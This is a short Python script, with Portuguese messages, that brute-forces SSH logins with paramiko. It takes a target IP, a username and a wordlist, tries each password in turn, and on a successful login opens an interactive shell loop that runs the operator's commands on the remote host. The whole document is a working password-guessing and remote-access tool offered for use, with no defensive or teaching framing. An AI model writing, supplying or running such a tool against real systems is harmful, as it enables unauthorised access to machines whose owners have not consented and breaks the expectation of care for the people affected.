import paramiko, sys

if len(sys.argv) != 4:
	print("Modo de uso:")
	print("python3 pyssh.py <ip> <user> <wordlist>")
	sys.exit(0)

ip=sys.argv[1]
username = sys.argv[2]
password = open(sys.argv[3],'r')


for n in password:

	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.load_system_host_keys()

	try:

		client.connect(ip,username=username,password=n.strip('\n'))
		print("Acesso bem-sucedido - comande 'quit' para sair")
		command = ""
		while command != "quit":
			command = input('>>> ')
			stdin, stdout, stderr = client.exec_command(command)


			for n in stdout.readlines():
				print(n.strip())

		client.close()

	except:

		print('Acesso negado')
